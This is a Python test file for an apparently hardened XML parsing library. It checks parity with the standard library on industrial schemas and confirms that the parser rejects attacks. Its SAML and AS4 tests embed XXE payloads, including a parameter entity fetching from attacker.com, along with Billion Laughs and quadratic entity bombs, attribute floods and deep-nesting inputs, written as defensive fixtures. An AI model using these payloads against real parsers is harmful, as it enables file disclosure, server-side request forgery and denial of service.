"""Industrial schema corpus validation and security hardening tests.

Validates SafeXML against polyxml-schema-corpus across enterprise domains:
  - Security (OASIS SAML 2.0, W3C XMLDSig)
  - Messaging (OASIS AS4 / ebMS 3.0 SOAP)
  - Finance (ISDA FpML 5.12, ISO 20022 SEPA pacs.008, camt.054)
  - Healthcare (HL7 FHIR R4, HL7 CDA R2.1)
  - Supply Chain & Government (OASIS UBL 2.1)
  - Defense & Aerospace (NATO/DoD UCI 2.5, ICAO/FAA FIXM 4.0)
  - Transit (CEN NeTEx, SIRI, railML)
"""

from __future__ import annotations

import xml.etree.ElementTree as std_ET
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import pytest

import safexml

_WORKSPACE_DIR = Path(__file__).resolve().parents[2]
CORPUS_DIR = _WORKSPACE_DIR / "polyxml-schema-corpus"
DEFENSE_DIR = _WORKSPACE_DIR / "polyxml-defense-examples"
FINANCE_DIR = _WORKSPACE_DIR / "polyxml-finance-examples"
TRANSIT_DIR = _WORKSPACE_DIR / "polyxml-transit-examples"


def assert_dom_equal(safe_elem: std_ET.Element, std_elem: std_ET.Element) -> None:
    """Recursively verify DOM structural equivalence between SafeXML and stdlib."""
    assert safe_elem.tag == std_elem.tag
    assert safe_elem.attrib == std_elem.attrib
    assert (safe_elem.text or "").strip() == (std_elem.text or "").strip()
    assert (safe_elem.tail or "").strip() == (std_elem.tail or "").strip()

    safe_children = list(safe_elem)
    std_children = list(std_elem)
    assert len(safe_children) == len(std_children)

    for sc, tc in zip(safe_children, std_children, strict=True):
        assert_dom_equal(sc, tc)


@pytest.mark.skipif(not CORPUS_DIR.exists(), reason="polyxml-schema-corpus not available")
def test_industrial_schemas_dom_parity() -> None:
    """Verify DOM parity across representative industrial schemas from polyxml-schema-corpus."""
    schema_relative_paths = [
        "schemas/security-saml/saml-schema-assertion-2.0.xsd",
        "schemas/security-saml/saml-schema-protocol-2.0.xsd",
        "schemas/messaging-as4/ebms-header-3_0.xsd",
        "schemas/iso20022/pacs.008.001.09.xsd",
        "schemas/iso20022/camt.054.001.08.xsd",
        "schemas/bpmn20/BPMN20.xsd",
        "schemas/geospatial-kml/ogckml22.xsd",
        "schemas/aviation-fixm/core/Fixm.xsd",
        "schemas/transit-railml/railML.xsd",
        "schemas/regulatory-xbrl/xbrl-instance-2003-12-31.xsd",
    ]

    for rel_path in schema_relative_paths:
        full_path = CORPUS_DIR / rel_path
        if not full_path.exists():
            continue
        data = full_path.read_bytes()

        safe_tree = safexml.fromstring(data)
        std_tree = std_ET.fromstring(data)

        assert_dom_equal(safe_tree, std_tree)


def test_industrial_instance_documents_dom_parity() -> None:
    """Verify DOM parity on real-world industrial XML instance payloads."""
    bundled_dir = Path(__file__).parent / "data/industrial_instances"
    instance_files = [
        bundled_dir / "uci_entity.xml",
        bundled_dir / "pacs_008_customer_credit_transfer.xml",
        bundled_dir / "siri_vehicle_monitoring.xml",
        DEFENSE_DIR / "data/uci_entity.xml",
        FINANCE_DIR / "data/pacs_008_customer_credit_transfer.xml",
        TRANSIT_DIR / "data/siri_vehicle_monitoring.xml",
    ]

    tested_count = 0
    seen_payloads = set()
    for inst_path in instance_files:
        if not inst_path.exists():
            continue
        data = inst_path.read_bytes()
        if data in seen_payloads:
            continue
        seen_payloads.add(data)
        safe_tree = safexml.fromstring(data)
        std_tree = std_ET.fromstring(data)
        assert_dom_equal(safe_tree, std_tree)
        tested_count += 1

    assert tested_count > 0


def test_saml_adversarial_attack_vectors() -> None:
    """Verify that adversarial attacks injected into SAML 2.0 assertions are blocked."""
    valid_saml = b"""<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_response123" Version="2.0" IssueInstant="2026-10-11T12:00:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>
  <samlp:Status>
    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
  </samlp:Status>
  <saml:Assertion ID="_assertion456" Version="2.0" IssueInstant="2026-10-11T12:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <saml:Subject>
      <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
        user@example.com
      </saml:NameID>
    </saml:Subject>
    <saml:AuthnStatement AuthnInstant="2026-10-11T12:00:00Z">
      <saml:AuthnContext>
        <saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>
      </saml:AuthnContext>
    </saml:AuthnStatement>
  </saml:Assertion>
</samlp:Response>"""

    # Baseline: valid SAML token parses cleanly
    root = safexml.fromstring(valid_saml)
    assert root.attrib["ID"] == "_response123"

    # Attack 1: XXE external DTD system entity
    xxe_saml = (
        b"""<!DOCTYPE samlp:Response SYSTEM "http://127.0.0.1:9999/evil.dtd">\n"""
        + valid_saml[valid_saml.find(b"<samlp:Response") :]
    )
    with pytest.raises(safexml.ExternalReferenceForbidden):
        safexml.fromstring(xxe_saml)

    # Attack 2: Billion Laughs exponential entity expansion inside assertion
    bomb_saml = b"""<!DOCTYPE samlp:Response [
        <!ENTITY lol "lol">
        <!ENTITY lol1 "&lol;&lol;">
        <!ENTITY lol2 "&lol1;&lol1;">
        <!ENTITY lol3 "&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;">
        ]>\n""" + valid_saml.replace(b"user@example.com", b"&lol4;")
    with pytest.raises(safexml.EntitiesForbidden):
        safexml.fromstring(bomb_saml)

    # Attack 3: Quadratic blowup inside SAML Subject NameID
    quad_saml = b"""<!DOCTYPE samlp:Response [
        <!ENTITY a "AAAAAAAAAAAAAAAAAAAA">
        ]>\n""" + valid_saml.replace(b"user@example.com", b"&a;&a;&a;&a;&a;&a;")
    with pytest.raises(safexml.EntitiesForbidden):
        safexml.fromstring(quad_saml)

    # Attack 4: Attribute flood DoS on saml:Assertion element
    flood_attrs = " ".join(f'attr{i}="val{i}"' for i in range(1500))
    flood_saml = valid_saml.replace(b"<saml:Assertion", f"<saml:Assertion {flood_attrs}".encode())
    with pytest.raises(safexml.DefusedXmlException):
        safexml.fromstring(flood_saml, max_attributes=1000)

    # Attack 5: Deep nesting injection inside AuthnContext
    nested_payload = b"<a>" * 200 + b"</a>" * 200
    nested_saml = valid_saml.replace(
        b"<saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:Password</saml:AuthnContextClassRef>",
        nested_payload,
    )
    with pytest.raises(safexml.DefusedXmlException):
        safexml.fromstring(nested_saml, max_depth=100)


def test_as4_adversarial_attack_vectors() -> None:
    """Verify that adversarial attacks injected into AS4 / ebMS3 SOAP envelopes are blocked."""
    valid_as4 = b"""<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"
               xmlns:eb="http://docs.oasis-open.org/ebxml-msg/ebms/v3.0/ns/core/200704/">
  <soap:Header>
    <eb:Messaging soap:mustUnderstand="true">
      <eb:UserMessage>
        <eb:MessageInfo>
          <eb:Timestamp>2026-10-11T12:00:00Z</eb:Timestamp>
          <eb:MessageId>20261011-12345@b2b.partner.org</eb:MessageId>
        </eb:MessageInfo>
        <eb:PartyInfo>
          <eb:From>
            <eb:PartyId>urn:oasis:names:tc:ebcore:partyid-type:unregistered:Buyer</eb:PartyId>
            <eb:Role>Buyer</eb:Role>
          </eb:From>
          <eb:To>
            <eb:PartyId>urn:oasis:names:tc:ebcore:partyid-type:unregistered:Seller</eb:PartyId>
            <eb:Role>Seller</eb:Role>
          </eb:To>
        </eb:PartyInfo>
        <eb:CollaborationInfo>
          <eb:Service>InvoiceService</eb:Service>
          <eb:Action>SubmitInvoice</eb:Action>
          <eb:ConversationId>conv-999</eb:ConversationId>
        </eb:CollaborationInfo>
      </eb:UserMessage>
    </eb:Messaging>
  </soap:Header>
  <soap:Body>
    <InvoicePayload id="payload-001">Invoice Content</InvoicePayload>
  </soap:Body>
</soap:Envelope>"""

    # Baseline: valid AS4 SOAP envelope parses cleanly
    root = safexml.fromstring(valid_as4)
    assert "Envelope" in root.tag

    # Attack 1: Parameter entity injection in SOAP DTD
    as4_param = b"""<!DOCTYPE soap:Envelope [
        <!ENTITY % pe SYSTEM "http://attacker.com/evil.dtd">
        %pe;
        ]>\n""" + valid_as4[valid_as4.find(b"<soap:Envelope") :]
    with pytest.raises(safexml.ExternalReferenceForbidden):
        safexml.fromstring(as4_param)

    # Attack 2: DTD forbidden option enforcement
    as4_dtd = (
        b"""<!DOCTYPE soap:Envelope [ <!ELEMENT soap:Envelope ANY> ]>\n"""
        + valid_as4[valid_as4.find(b"<soap:Envelope") :]
    )
    with pytest.raises(safexml.DTDForbidden):
        safexml.fromstring(as4_dtd, forbid_dtd=True)

    # Attack 3: Oversized tag name bomb in SOAP Body payload
    as4_tag_bomb = valid_as4.replace(b"InvoicePayload", b"A" * 2000)
    with pytest.raises(safexml.DefusedXmlException):
        safexml.fromstring(as4_tag_bomb, max_name_size=1024)


@pytest.mark.skipif(not CORPUS_DIR.exists(), reason="polyxml-schema-corpus not available")
def test_large_industrial_document_throughput_and_concurrency() -> None:
    """Benchmark throughput and multi-threaded concurrency on large industrial documents."""
    large_files = [
        CORPUS_DIR / "schemas/ubl-2.1/common/UBL-CommonAggregateComponents-2.1.xsd",
        CORPUS_DIR / "schemas/hl7-fhir/fhir-single.xsd",
        CORPUS_DIR / "schemas/defense-uci/UCI_MessageDefinitions_v2_5_0.xsd",
    ]

    for f in large_files:
        if not f.exists():
            continue
        data = f.read_bytes()

        # Parse with SafeXML
        root = safexml.fromstring(data)
        assert len(root) > 100

        # Verify multi-threaded execution without GIL deadlocks or corruption
        def worker(payload: bytes) -> int:
            elem = safexml.fromstring(payload)
            return len(elem)

        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = [executor.submit(worker, data) for _ in range(8)]
            results = [fut.result() for fut in futures]

        assert len(results) == 8
        assert all(r == len(root) for r in results)
